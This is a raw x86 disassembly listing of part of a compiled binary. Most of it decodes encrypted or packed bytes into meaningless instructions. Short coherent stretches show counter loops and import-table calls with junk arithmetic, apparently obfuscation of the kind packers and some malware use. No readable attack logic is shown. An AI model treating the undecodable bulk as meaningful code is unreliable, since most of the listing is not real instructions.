  411fb6:	imul   edx,esi,0x79ef99ca
  411fbc:	shl    DWORD PTR [ebp+eiz*1+0x6c],1
  411fc0:	outs   dx,DWORD PTR ds:[esi]
  411fc1:	(bad)  
  411fc3:	into   
  411fc4:	es in  al,0x5e
  411fc7:	push   edi
  411fc8:	mov    edx,0xed540946
  411fcd:	xchg   esp,eax
  411fce:	lock pop ebp
  411fd0:	aas    
  411fd1:	stos   DWORD PTR es:[edi],eax
  411fd2:	clc    
  411fd3:	and    ebp,ecx
  411fd5:	mov    esi,0x53f5f95b
  411fda:	mov    ebp,0xca5b8957
  411fdf:	sbb    BYTE PTR [eax+0x79],ah
  411fe2:	shr    BYTE PTR [ecx],1
  411fe4:	jmp    0xf3fa:0xc1852d3d
  411feb:	jmp    0x411ffb
  411fed:	jne    0x411fca
  411fef:	mul    BYTE PTR [ecx-0x5bf38f67]
  411ff5:	leave  
  411ff6:	aad    0xf1
  411ff8:	xor    al,0xd0
  411ffa:	stos   BYTE PTR es:[edi],al
  411ffb:	in     eax,dx
  411ffc:	add    al,0xe3
  411ffe:	fidiv  WORD PTR [esi-0x9]
  412001:	mov    DWORD PTR [ebp-0x311668f],edx
  412007:	pop    ecx
  412008:	push   eax
  412009:	enter  0xe73,0x16
  41200d:	and    ecx,edi
  41200f:	push   es
  412010:	mov    ?,WORD PTR [ebp-0x55706ca]
  412016:	add    edi,ebx
  412018:	lock xor ax,0x7c1c
  41201d:	scas   al,BYTE PTR es:[edi]
  41201e:	mov    ecx,0xe51ba82
  412023:	xchg   BYTE PTR [esi-0x450da40d],al
  412029:	xor    DWORD PTR [ebx],esi
  41202b:	push   ds
  41202c:	push   ds
  41202d:	ss adc edx,ecx
  412030:	lock push esi
  412032:	jmp    0xc451bb7
  412037:	push   ds
  412038:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412039:	in     al,dx
  41203a:	mov    dl,0x8d
  41203c:	mov    al,0x2b
  41203e:	and    al,0x94
  412040:	mov    cl,0x5a
  412042:	enter  0x1c08,0xd
  412046:	(bad)  
  412047:	cmp    BYTE PTR [ebp+0x52],dl
  41204a:	and    edx,esp
  41204c:	jp     0x41208f
  41204e:	(bad)  
  41204f:	xchg   BYTE PTR [ebx-0x60c48762],dl
  412055:	ds jne 0x41204a
  412058:	add    al,0x4f
  41205a:	(bad)
  41205d:	dec    ebp
  41205e:	rcl    BYTE PTR [eax-0x3a21f7c0],1
  412064:	aam    0x16
  412066:	hlt    
  412067:	mov    bl,0xeb
  412069:	cdq    
  41206a:	xor    eax,0x86e51843
  41206f:	pop    ebx
  412070:	push   esp
  412071:	cmp    DWORD PTR [edx+0x1f],esp
  412074:	add    dl,0xbe
  412077:	(bad)  
  412078:	sbb    BYTE PTR [ebx-0x23],al
  41207b:	and    edi,edi
  41207d:	in     al,0x5
  41207f:	cli    
  412080:	mov    eax,ds:0x6830a75
  412085:	add    eax,0xb6a1fdc6
  41208a:	scas   al,BYTE PTR es:[edi]
  41208b:	inc    esp
  41208c:	lods   eax,DWORD PTR ds:[esi]
  41208d:	jo     0x4120a1
  41208f:	je     0x41205c
  412091:	rcr    BYTE PTR [ebp+eiz*8-0x46],0x27
  412096:	gs jp  0x412111
  412099:	neg    DWORD PTR [ecx-0x4b]
  41209c:	mov    dl,0xdd
  41209e:	mov    ebp,esi
  4120a0:	mov    dl,0xf3
  4120a2:	cwde   
  4120a3:	xchg   ebx,eax
  4120a4:	push   es
  4120a5:	(bad)  
  4120a6:	pop    edi
  4120a7:	push   es
  4120a8:	out    0x8b,eax
  4120aa:	inc    ebp
  4120ab:	or     BYTE PTR [ebx+0x240d8b00],cl
  4120b1:	mov    dl,0x41
  4120b3:	add    BYTE PTR [ecx],al
  4120b5:	or     BYTE PTR [esi+0x5d],bl
  4120b8:	ret    0x8
  4120bb:	push   ebp
  4120bc:	mov    ebp,esp
  4120be:	sub    esp,0x30
  4120c1:	and    ecx,DWORD PTR ds:0x42fe76
  4120c7:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  4120ce:	mov    eax,ds:0x42fdd5
  4120d3:	adc    DWORD PTR ds:0x42e7ef,eax
  4120d9:	mov    DWORD PTR [ebp-0x18],0xf89c8530
  4120e0:	sbb    DWORD PTR ds:0x42e7eb,0x6a34
  4120ea:	mov    ecx,DWORD PTR [ebp-0x4]
  4120ed:	sub    DWORD PTR ds:0x42e803,0x730a
  4120f7:	push   ebx
  4120f8:	mov    DWORD PTR ds:0x42e7fb,0x19
  412102:	cmp    DWORD PTR ds:0x42e7fb,0x0
  412109:	je     0x412140
  41210f:	cmp    DWORD PTR ds:0x42e7fb,0x1e
  412116:	jne    0x41212e
  41211c:	push   0x42fe7e
  412121:	push   0x0
  412123:	push   0x42e36d
  412128:	call   DWORD PTR ds:0x42e583
  41212e:	mov    ebx,DWORD PTR ds:0x42e7fb
  412134:	dec    ebx
  412135:	mov    DWORD PTR ds:0x42e7fb,ebx
  41213b:	jmp    0x412102
  412140:	mov    eax,0x7510855
  412145:	xor    ecx,eax
  412147:	sub    ebx,0x2eeb
  41214d:	mov    ebx,0x32729c
  412152:	sbb    DWORD PTR ds:0x42e220,0x42fe01
  41215c:	jmp    0x412440
  412161:	mov    edx,0xf222c858
  412166:	mov    dl,0x6a
  412168:	pop    eax
  412169:	dec    eax
  41216a:	xor    bh,0xa0
  41216d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41216e:	pop    esi
  41216f:	gs pop edx
  412171:	inc    esi
  412172:	pop    edi
  412173:	jo     0x4121e5
  412175:	mov    ecx,0x5970707e
  41217a:	and    eax,0x86500de4
  41217f:	sub    cl,dl
  412181:	gs dec eax
  412183:	push   0x2e
  412185:	cmc    
  412186:	adc    DWORD PTR [eax],0xbd75e3b3
  41218c:	mov    al,ah
  41218e:	fisubr WORD PTR [eax-0x58]
  412191:	outs   dx,BYTE PTR ds:[esi]
  412192:	lods   eax,DWORD PTR ds:[esi]
  412193:	mov    es,WORD PTR [edi+esi*2]
  412196:	sahf   
  412197:	push   ebp
  412198:	adc    BYTE PTR [eax-0x2ddcf717],ah
  41219e:	sbb    eax,0x6adea545
  4121a3:	add    eax,0x7e14ccd2
  4121a8:	cmp    eax,0x2567041
  4121ad:	pop    ebp
  4121ae:	jle    0x4121f5
  4121b0:	(bad)  
  4121b1:	aam    0x57
  4121b3:	test   DWORD PTR [esi+0x6a13cd81],esp
  4121b9:	jb     0x412143
  4121bb:	mov    esi,0x44767ae2
  4121c0:	dec    eax
  4121c1:	ret    0xa0a4
  4121c4:	outs   dx,DWORD PTR ds:[esi]
  4121c5:	cmp    al,0x60
  4121c7:	pop    eax
  4121c8:	fld    TBYTE PTR [ebx+0x6c04e728]
  4121ce:	fisttp WORD PTR [edx+0x70]
  4121d1:	mov    bp,0xdcdf
  4121d5:	fsubr  DWORD PTR [ebp-0x8]
  4121d8:	stos   BYTE PTR es:[edi],al
  4121d9:	dec    ebp
  4121da:	jne    0x412188
  4121dc:	adc    DWORD PTR [edi+eiz*8],ebp
  4121df:	stos   BYTE PTR es:[edi],al
  4121e0:	push   eax
  4121e1:	dec    edi
  4121e2:	mov    bl,0x90
  4121e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4121e5:	ins    BYTE PTR es:[edi],dx
  4121e6:	fs leave 
  4121e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4121e9:	mov    bh,0x7e
  4121eb:	inc    esi
  4121ec:	retf   0xdc4a
  4121ef:	ja     0x4121db
  4121f1:	cmp    DWORD PTR ds:0x3beaa7a2,esp
  4121f7:	pop    es
  4121f8:	shr    DWORD PTR [bx+di+0x3a],cl
  4121fc:	rsqrtps xmm0,xmm5
  4121ff:	retf   
  412200:	js     0x412246
  412202:	out    0x1,al
  412204:	mov    ch,0x2b
  412206:	gs mov ch,0x22
  412209:	rol    BYTE PTR [esi+0x20],0x97
  41220d:	iret   
  41220e:	or     DWORD PTR ds:0xcd233266,edx
  412214:	daa    
  412215:	push   es
  412216:	xchg   ebx,eax
  412217:	fild   QWORD PTR [eax-0x71d89e6e]
  41221d:	add    edx,eax
  41221f:	(bad)  
  412220:	pop    esi
  412221:	and    BYTE PTR [eax-0x42],al
  412224:	adc    edx,DWORD PTR [eax+ebx*4-0x322f893]
  41222b:	les    eax,FWORD PTR [ecx+0x5cbf3aa9]
  412231:	in     eax,0xa3
  412233:	and    BYTE PTR [esi+0x62],dh
  412236:	retf   
  412237:	jmp    0x4122a4
  412239:	dec    ebp
  41223a:	iret   
  41223b:	sub    al,0xe1
  41223d:	adc    cl,BYTE PTR [eax+ebp*2+0x70]
  412241:	int3   
  412242:	mov    ebx,0xa4d3577
  412247:	sub    ebp,edi
  412249:	sahf   
  41224a:	inc    ebp
  41224b:	ins    BYTE PTR es:[edi],dx
  41224c:	fadd   QWORD PTR [ebp+0x6904dce1]
  412252:	ficom  WORD PTR [ebx+0x4a]
  412255:	adc    ebx,DWORD PTR [edi-0x3363dbb5]
  41225b:	mov    bh,0x41
  41225d:	mov    esi,DWORD PTR [ebp-0x229f1711]
  412263:	cs sbb al,0x8
  412266:	adc    edx,DWORD PTR [ebx-0x42681c7c]
  41226c:	call   0x4142cea6
  412271:	fmul   DWORD PTR [edx+0x426cab3e]
  412277:	mov    ecx,0x554836b9
  41227c:	repnz aaa 
  41227e:	imul   edx,eax,0xd2fa792d
  412284:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412285:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412286:	jp     0x4122d8
  412288:	dec    edi
  412289:	aad    0xfa
  41228b:	retf   
  41228c:	push   eax
  41228d:	in     eax,dx
  41228e:	mov    esp,0xbf17c1a6
  412293:	add    ebp,DWORD PTR [eax+0x2dc199e7]
  412299:	stc    
  41229a:	mov    cl,0x3a
  41229c:	adc    BYTE PTR [edi],dh
  41229e:	dec    esi
  41229f:	js     0x4122e4
  4122a1:	loopne 0x41223a
  4122a3:	xchg   ebp,eax
  4122a4:	xor    ebp,ecx
  4122a6:	mov    ebx,0xaf1867d
  4122ab:	test   eax,0x4a15ba1e
  4122b0:	int    0x56
  4122b2:	push   ebp
  4122b3:	out    dx,eax
  4122b4:	imul   esp,DWORD PTR [edi+edx*1+0x3e],0xffffffd8
  4122b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4122ba:	dec    esp
  4122bb:	das    
  4122bc:	data16 sbb ah,bh
  4122bf:	xor    al,0xb8
  4122c1:	adc    al,0x65
  4122c3:	scas   eax,DWORD PTR es:[edi]
  4122c4:	imul   DWORD PTR [ebx-0x41b50acd]
  4122ca:	fisubr DWORD PTR [ebx-0xc]
  4122cd:	pop    edx
  4122ce:	in     eax,dx
  4122cf:	into   
  4122d0:	test   edi,ebp
  4122d2:	scas   eax,DWORD PTR es:[edi]
  4122d3:	pop    eax
  4122d4:	cmp    BYTE PTR [ecx+0x8],dl
  4122d7:	mov    esp,0x80260692
  4122dc:	ret    
  4122dd:	mov    BYTE PTR [ebx-0x3b],dl
  4122e0:	sub    DWORD PTR [ecx],edx
  4122e2:	push   0xa49ac259
  4122e7:	imul   ecx,DWORD PTR cs:[ecx-0x79],0xeb47923d
  4122ef:	xor    bl,BYTE PTR [esi+0x1f]
  4122f2:	(bad)  
  4122f3:	int    0x27
  4122f5:	popf   
  4122f6:	je     0x412278
  4122f8:	jle    0x41234b
  4122fa:	adc    bh,BYTE PTR [ecx]
  4122fc:	gs nop
  4122fe:	cmp    DWORD PTR [edx-0x46],ebx
  412301:	mov    WORD PTR [ecx-0x2b205d35],es
  412307:	xchg   ebp,eax
  412308:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412309:	xlat   BYTE PTR ds:[ebx]
  41230a:	das    
  41230b:	mov    eax,ds:0xfcdb9df6
  412310:	mov    dh,0x15
  412312:	cmp    DWORD PTR [esi-0x2e05ebb2],0xdcf267e2
  41231c:	call   0xa49d1e40
  412321:	out    dx,al
  412322:	cwde   
  412323:	pop    ebp
  412324:	out    dx,al
  412325:	test   cl,bh
  412327:	mov    eax,0xd4210f97
  41232c:	cmovl  esp,DWORD PTR [ebx]
  41232f:	std    
  412330:	fisttp QWORD PTR [eax]
  412332:	pop    ebp
  412333:	addr16 mov al,0xa4
  412336:	fdivr  DWORD PTR ds:0x94893324
  41233c:	inc    edx
  41233d:	mov    edi,0xdd89899b
  412342:	sbb    DWORD PTR ds:[eax+0x60842955],eax
  412349:	mov    ah,dl
  41234b:	xor    BYTE PTR [ecx],ch
  41234d:	dec    esp
  41234e:	lahf   
  41234f:	add    BYTE PTR [ebx],dh
  412351:	dec    ebp
  412352:	push   ds
  412353:	inc    esp
  412354:	mov    edx,DWORD PTR [esi-0x27d3af9a]
  41235a:	mov    cl,0xd3
  41235c:	sbb    edx,DWORD PTR [ecx+edx*8]
  41235f:	fsub   QWORD PTR [eax]
  412361:	adc    al,0xa
  412363:	sbb    al,0x70
  412365:	push   0xffffffad
  412367:	cmp    al,bh
  412369:	popf   
  41236a:	inc    edi
  41236b:	es loopne 0x41233a
  41236e:	stos   DWORD PTR es:[edi],eax
  41236f:	pop    ecx
  412370:	cmp    al,0x34
  412372:	xchg   BYTE PTR [eax-0x3c32c723],dl
  412378:	pushf  
  412379:	sub    eax,0xac148fcb
  41237e:	dec    ecx
  41237f:	data16 scas al,BYTE PTR es:[edi]
  412381:	outs   dx,BYTE PTR ds:[esi]
  412382:	rcl    DWORD PTR [eax+0x3ee7ad1a],cl
  412388:	sbb    eax,0xb289ccfe
  41238d:	adc    eax,0x93438c08
  412392:	lds    eax,FWORD PTR [esi]
  412394:	stos   DWORD PTR es:[edi],eax
  412395:	icebp  
  412396:	fisub  WORD PTR [edx+0x10c79e0]
  41239c:	adc    eax,0x44de2815
  4123a1:	adc    BYTE PTR [ebp+0xa],bh
  4123a4:	data16 cmp al,0x69
  4123a7:	adc    bh,BYTE PTR [edi-0x631e1e99]
  4123ad:	fs addr16 aad 0xe4
  4123b1:	jne    0x412416
  4123b3:	jns    0x4123a2
  4123b5:	sbb    BYTE PTR [esi-0x3f],bh
  4123b8:	aas    
  4123b9:	pop    ecx
  4123ba:	dec    esp
  4123bb:	pop    es
  4123bc:	ror    DWORD PTR [edi-0x6b],1
  4123bf:	fisub  DWORD PTR [edx+0x40dbb497]
  4123c5:	sbb    ch,BYTE PTR [ebx-0x5f34673b]
  4123cb:	(bad)  
  4123cc:	adc    bl,BYTE PTR [ebp-0x9a49e5]
  4123d2:	sar    DWORD PTR [eax-0xc],1
  4123d5:	sahf   
  4123d6:	sbb    eax,0x336f30a8
  4123db:	xor    DWORD PTR [esi+0x69c7c9c4],0x5b
  4123e2:	inc    esi
  4123e3:	add    ebx,DWORD PTR [eax-0x80]
  4123e6:	sbb    eax,esp
  4123e8:	jae    0x41241c
  4123ea:	xchg   ebx,eax
  4123eb:	loopne 0x4123c0
  4123ed:	fld    QWORD PTR [eax]
  4123ef:	out    0x51,eax
  4123f1:	jo     0x412466
  4123f3:	jecxz  0x412400
  4123f5:	push   es
  4123f6:	repz sti 
  4123f8:	in     al,0x3c
  4123fa:	mov    dh,0xd6
  4123fc:	data16 std 
  4123fe:	adc    ah,BYTE PTR [ecx+0x5926ac9a]
  412404:	ficomp DWORD PTR [eax+0xe83537e]
  41240a:	gs pop ebx
  41240c:	adc    BYTE PTR [esi],dh
  41240e:	int3   
  41240f:	or     esi,DWORD PTR [esi]
  412411:	ror    BYTE PTR [esi-0x522be6b1],0xe3
  412418:	add    eax,0xe05dd0f9
  41241d:	stc    
  41241e:	sar    BYTE PTR [ecx+0x64],cl
  412421:	add    al,0x5d
  412423:	hlt    
  412424:	aas    
  412425:	add    al,0x3f
  412427:	in     al,dx
  412428:	xchg   ebx,eax
  412429:	dec    esi
  41242a:	iret   
  41242b:	pop    ebx
  41242c:	test   DWORD PTR [edi+0x1e],0xc60e3e3
  412433:	sub    BYTE PTR [eax-0x56],0x37
  412437:	mov    bl,BYTE PTR [ebx-0x71]
  41243a:	mov    es,edx
  41243c:	jo     0x4124a1
  41243e:	sub    dl,BYTE PTR [ebx]
  412440:	add    ecx,ebx
  412442:	sub    DWORD PTR ds:0x42fdf9,0xf96
  41244c:	jmp    0x412730
  412451:	hlt    
  412452:	xor    BYTE PTR [ebx+edi*8+0x74],bl
  412456:	fwait
  412457:	repz ja 0x41244c
  41245a:	inc    ecx
  41245b:	xchg   ecx,eax
  41245c:	aaa    
  41245d:	pop    eax
  41245e:	fucomi st,st(2)
  412460:	or     DWORD PTR [edi-0x468f8fa4],0x7e
  412467:	jo     0x4124d9
  412469:	xchg   DWORD PTR [ecx],esi
  41246b:	stc    
  41246c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41246d:	iret   
  41246e:	imul   ecx,DWORD PTR [eax+0x35],0x39
  412472:	hlt    
  412473:	jl     0x412433
  412475:	mov    ah,BYTE PTR [ebx-0x50]
  412478:	inc    esp
  412479:	xor    dl,BYTE PTR [ebx-0x499bf99a]
  41247f:	pop    esi
  412480:	dec    ebp
  412481:	xchg   edi,eax
  412482:	or     dl,BYTE PTR [edi+edi*4]
  412485:	adc    ebp,DWORD PTR [eax]
  412487:	cld    
  412488:	jl     0x412489
  41248a:	pop    ds
  41248b:	fs and eax,0x5da471f2
  412491:	inc    edx
  412492:	jo     0x412482
  412494:	add    ah,BYTE PTR [edx-0x24]
  412497:	leave  
  412498:	dec    edi
  412499:	jb     0x412511
  41249b:	out    0x54,al
  41249d:	call   0x93d39e77
  4124a2:	nop
  4124a3:	in     eax,0xa9
  4124a5:	pop    ds
  4124a6:	mov    cl,0xf2
  4124a8:	ret    0x8998
  4124ab:	jl     0x412528
  4124ad:	bound  edi,QWORD PTR [ebp-0x2c041516]
  4124b3:	xor    BYTE PTR [ebx+eax*8+0x20f5a5bb],ch
  4124ba:	(bad)  
  4124bb:	retf   
  4124bc:	aad    0x98
  4124be:	outs   dx,DWORD PTR ds:[esi]
  4124bf:	dec    esi
  4124c0:	mov    cl,0xb6
  4124c2:	jb     0x412510
  4124c4:	inc    ecx
  4124c5:	sahf   
  4124c6:	pop    eax
  4124c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4124c8:	into   
  4124c9:	mov    ds:0x98e59b26,al
  4124ce:	add    eax,DWORD PTR [esi+0x4ea6b0a2]
  4124d4:	lahf   
  4124d5:	xor    BYTE PTR [esi],dl
  4124d7:	add    DWORD PTR [ebx+0x693d5238],eax
  4124dd:	jmp    0x41247f
  4124df:	mov    eax,0x7427ab1d
  4124e4:	pop    es
  4124e5:	sub    DWORD PTR [esi],edi
  4124e7:	mov    eax,ds:0xd88cc6f5
  4124ec:	cmp    DWORD PTR [esi-0x5b],0xffffffe5
  4124f0:	pusha  
  4124f1:	xchg   ebx,eax
  4124f2:	cmp    BYTE PTR [esp+edx*8-0x2691e641],0xa4
  4124fa:	sub    dl,cl
  4124fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4124fd:	xchg   edi,eax
  4124fe:	stos   DWORD PTR es:[edi],eax
  4124ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412500:	jg     0x412577
  412502:	retf   
  412503:	imul   ebx,DWORD PTR [ecx-0x7e],0x3b153266
  41250a:	rcl    BYTE PTR ds:0xad78d2af,1
  412510:	adc    DWORD PTR [esi-0x6e0a8968],ebx
  412516:	add    al,0xb4
  412518:	dec    esp
  412519:	pop    esi
  41251a:	xchg   ebp,eax
  41251b:	pop    esp
  41251c:	sub    eax,0xd20be84a
  412521:	xchg   edi,eax
  412522:	mov    bh,0xd7
  412524:	and    al,0x22
  412526:	sub    edx,DWORD PTR [edi+0x1b]
  412529:	cmc    
  41252a:	xor    BYTE PTR [edx+edx*2-0x204f0677],0x78
  412532:	mov    ah,0x32
  412534:	fcom   QWORD PTR [ebx]
  412536:	dec    eax
  412537:	sub    DWORD PTR cs:[ecx+0x3b72ef41],eax
  41253e:	ss pop ecx
  412540:	es jae 0x4124e1
  412543:	xchg   ecx,eax
  412544:	jmp    0x4124dc
  412546:	js     0x412583
  412548:	shl    bl,1
  41254a:	imul   edi,DWORD PTR [eax+esi*4],0x12
  41254e:	cli    
  41254f:	rcr    DWORD PTR [ebx+esi*8],1
  412552:	pop    ecx
  412553:	pop    edi
  412554:	je     0x412554
  412556:	or     al,0x5f
  412558:	jne    0x4125a4
  41255a:	loope  0x412560
  41255c:	adc    eax,0x83867348
  412561:	int3   
  412562:	nop
  412563:	dec    ecx
  412564:	iret   
  412565:	cdq    
  412566:	es push cs
  412568:	sbb    al,0x19
  41256a:	push   0xffffffc2
  41256c:	outs   dx,BYTE PTR ds:[esi]
  41256d:	das    
  41256e:	dec    edx
  41256f:	sbb    eax,edx
  412571:	ja     0x412541
  412573:	not    DWORD PTR [ebx+0x5a62fa31]
  412579:	shr    BYTE PTR [ecx+eax*4+0x57],cl
  41257d:	xchg   edi,eax
  41257e:	jo     0x41259a
  412580:	pop    eax
  412581:	out    0x35,eax
  412583:	inc    edi
  412584:	push   edi
  412585:	mov    ebp,0xf1c3f1da
  41258a:	cdq    
  41258b:	pop    ss
  41258c:	adc    cl,dh
  41258e:	pop    ds
  41258f:	fnsave [edx-0x54]
  412592:	(bad)
  412595:	or     DWORD PTR [edx+ebp*8],0x79
  412599:	std    
  41259a:	cmp    ebp,DWORD PTR [ebx+0x6a]
  41259d:	jp     0x528d25f
  4125a3:	lds    ebp,FWORD PTR [ebx-0x4f]
  4125a6:	cmp    eax,0x8c743bbe
  4125ab:	xlat   BYTE PTR ds:[ebx]
  4125ac:	fidiv  WORD PTR [edi]
  4125ae:	into   
  4125af:	shl    DWORD PTR [esi],1
  4125b1:	push   ss
  4125b2:	mov    bh,0x60
  4125b4:	jne    0x4125bf
  4125b6:	mov    edi,0xb8e18148
  4125bb:	retf   
  4125bc:	les    ecx,FWORD PTR [eax]
  4125be:	and    eax,0xed077f4c
  4125c3:	push   esi
  4125c4:	scas   al,BYTE PTR es:[edi]
  4125c5:	outs   dx,BYTE PTR ds:[esi]
  4125c6:	in     eax,0xd8
  4125c8:	jns    0x412568
  4125ca:	(bad)  
  4125cb:	and    al,0x93
  4125cd:	lock adc dl,BYTE PTR [edx]
  4125d0:	or     al,0x4c
  4125d2:	stos   BYTE PTR es:[edi],al
  4125d3:	cmp    al,0xbf
  4125d5:	data16 fwait
  4125d7:	and    al,BYTE PTR [ebx-0x78]
  4125da:	push   ebx
  4125db:	cmp    bl,BYTE PTR [esi+0x4d]
  4125de:	lock dec esp
  4125e0:	xchg   DWORD PTR [ecx+0x7],edx
  4125e3:	fs adc eax,0x99117644
  4125e9:	clc    
  4125ea:	sub    BYTE PTR ds:0xbc6df90a,ch
  4125f0:	jb     0x4125fa
  4125f2:	fxch   st(2)
  4125f4:	add    ebx,edi
  4125f6:	jp     0x412631
  4125f8:	test   BYTE PTR [eax],al
  4125fa:	adc    DWORD PTR [eax-0x5f],ebp
  4125fd:	pop    edi
  4125fe:	inc    ebx
  4125ff:	scas   al,BYTE PTR es:[edi]
  412600:	(bad)  
  412602:	mov    cl,0x72
  412604:	mul    DWORD PTR [ecx]
  412606:	xchg   edx,eax
  412607:	sahf   
  412608:	lahf   
  412609:	mov    cl,0x6f
  41260b:	pop    ss
  41260c:	cmc    
  41260d:	inc    ecx
  41260e:	lahf   
  41260f:	push   es
  412610:	mov    bh,0x38
  412612:	push   es
  412613:	in     eax,0x33
  412615:	mov    esi,0xbbd5397d
  41261a:	jnp    0x4125b3
  41261c:	shr    BYTE PTR [ecx-0x4d9428a6],0x45
  412623:	iret   
  412624:	outs   dx,BYTE PTR ds:[esi]
  412625:	sbb    eax,0xf3ef0e32
  41262b:	xchg   edi,eax
  41262c:	aam    0x6c
  41262e:	nop
  41262f:	inc    esi
  412630:	fcmovb st,st(4)
  412632:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412633:	popf   
  412634:	hlt    
  412635:	push   ebx
  412636:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412637:	pop    esi
  412638:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412639:	push   esp
  41263a:	in     eax,dx
  41263b:	pop    eax
  41263c:	fsubr  QWORD PTR [ecx-0x781a7973]
  412642:	rcr    DWORD PTR [eax-0x5d8889ad],0xe1
  412649:	or     al,0xf8
  41264b:	imul   ebp,DWORD PTR ds:0x44981066,0x8cc4edf3
  412655:	lahf   
  412656:	ret    0x70b2
  412659:	mov    WORD PTR ds:0xe2c8ec24,cs
  41265f:	xchg   ecx,eax
  412660:	xor    al,BYTE PTR [ebx]
  412662:	test   al,0x11
  412664:	dec    eax
  412665:	mov    ds:0x3b38ab13,eax
  41266a:	shl    DWORD PTR [eax-0x41],0x32
  41266e:	loope  0x4126dc
  412670:	aam    0x51
  412672:	push   ecx
  412673:	aas    
  412674:	mov    ebx,0xbcde91f3
  412679:	jmp    0xc031:0x1b44edfe
  412680:	fucomp st(3)
  412682:	cmp    BYTE PTR [ebp-0x2ba1a092],bl
  412688:	popf   
  412689:	and    al,0x68
  41268b:	sub    ebx,ebx
  41268d:	mov    esp,0xd0c79c0a
  412692:	shl    ecx,0x7a
  412695:	sbb    al,0xef
  412697:	dec    ecx
  412698:	rol    ch,1
  41269a:	mov    esi,0x4fe7757c
  41269f:	out    0x70,eax
  4126a1:	je     0x4126f4
  4126a3:	sbb    al,0x6b
  4126a5:	cwde   
  4126a6:	js     0x412697
  4126a8:	and    al,0x24
  4126aa:	and    ch,BYTE PTR [ecx]
  4126ac:	xor    ah,al
  4126ae:	mov    ds:0xb7b0c776,eax
  4126b3:	test   ch,bh
  4126b5:	lods   eax,DWORD PTR ds:[esi]
  4126b6:	out    0xb2,eax
  4126b8:	leave  
  4126b9:	push   edi
  4126ba:	and    eax,0xa1190f13
  4126bf:	shl    DWORD PTR [esp+ebp*2+0x2b],cl
  4126c3:	ror    DWORD PTR [eax+ebp*4],0x0
  4126c7:	mov    bl,0x1e
  4126c9:	jp     0x41264e
  4126cb:	cmp    eax,0x62c4d22e
  4126d0:	xchg   ebx,eax
  4126d1:	sti    
  4126d2:	mov    esi,0x94a9275e
  4126d7:	popw   ds
  4126d9:	retf   
  4126da:	adc    eax,0xc685bfdf
  4126df:	or     eax,0xda4ee307
  4126e4:	popf   
  4126e5:	inc    esp
  4126e6:	clc    
  4126e7:	rcl    DWORD PTR [edi-0x2e504a04],cl
  4126ed:	sahf   
  4126ee:	xchg   edi,eax
  4126ef:	mov    bl,0x99
  4126f1:	mov    cl,0x37
  4126f3:	ja     0x4126c1
  4126f5:	cmp    edi,DWORD PTR [ebx-0x331c87e0]
  4126fb:	xor    BYTE PTR [ecx],dl
  4126fd:	das    
  4126fe:	cmc    
  4126ff:	inc    edi
  412700:	jle    0x41272b
  412702:	int3   
  412703:	dec    esi
  412704:	les    edx,FWORD PTR [edi+0x55]
  412707:	mov    cl,0xf5
  412709:	retf   0xde32
  41270c:	loop   0x4126bb
  41270e:	stos   BYTE PTR es:[edi],al
  41270f:	pop    ss
  412710:	scas   al,BYTE PTR es:[edi]
  412711:	mov    ch,0x37
  412713:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412714:	dec    esi
  412715:	scas   eax,DWORD PTR es:[edi]
  412716:	or     ch,BYTE PTR [ebp-0x5c]
  412719:	mov    ?,WORD PTR ds:0xe2199b1f
  41271f:	aaa    
  412720:	imul   ebx,ebx,0x5e
  412723:	lods   eax,DWORD PTR ds:[esi]
  412724:	fbstp  TBYTE PTR [ebx+ebp*4-0x11]
  412728:	in     eax,0x5c
  41272a:	mov    BYTE PTR [edx-0x7c],ah
  41272d:	or     BYTE PTR [esi-0x1bb27657],bl
  412733:	and    DWORD PTR ds:0x42fe76,0x0
  41273d:	jmp    0x412751
  412742:	xor    ecx,ecx
  412744:	or     ecx,DWORD PTR ds:0x42fe76
  41274a:	inc    ecx
  41274b:	mov    DWORD PTR ds:0x42fe76,ecx
  412751:	cmp    DWORD PTR ds:0x42fe76,0x1c
  412758:	jae    0x41279b
  41275e:	cmp    DWORD PTR ds:0x42fe76,0x11
  412765:	jne    0x41277c
  41276b:	push   0x5b8f
  412770:	push   DWORD PTR [ebp-0x20]
  412773:	push   DWORD PTR [ebp-0x14]
  412776:	call   DWORD PTR ds:0x42e413
  41277c:	cmp    DWORD PTR ds:0x42fe76,0x10
  412783:	jne    0x412796
  412789:	mov    ecx,DWORD PTR ds:0x42fe76
  41278f:	inc    ecx
  412790:	mov    DWORD PTR ds:0x42fe76,ecx
  412796:	jmp    0x412742
  41279b:	mov    ecx,DWORD PTR [ebp+0x14]
  41279e:	push   esi
  41279f:	xor    DWORD PTR ds:0x42fe6e,0x1648
  4127a9:	push   edi
  4127aa:	test   ecx,ecx
  4127ac:	jmp    0x412a90
  4127b1:	mov    ds:0xc112c158,eax
  4127b6:	mov    cl,0x73
  4127b8:	jne    0x4127c0
  4127ba:	jne    0x4127b4
  4127bc:	sub    ebp,DWORD PTR [edx-0x37908866]
  4127c2:	pop    ecx
  4127c3:	jo     0x412835
  4127c5:	mov    ecx,0xfd70707e
  4127ca:	mov    bl,0x1
  4127cc:	cdq    
  4127cd:	mov    esi,DWORD PTR [esi]
  4127cf:	movlps QWORD PTR [esi],xmm4
  4127d2:	fcos   
  4127d4:	fdiv   QWORD PTR [ebp*4-0x1c114416]
  4127db:	add    BYTE PTR [esi+eax*2-0x42061127],ch
  4127e2:	rol    DWORD PTR [edi],1
  4127e4:	js     0x412782
  4127e6:	xlat   BYTE PTR ds:[ebx]
  4127e7:	mov    dl,0x3f
  4127e9:	inc    edx
  4127ea:	in     eax,dx
  4127eb:	inc    ebx
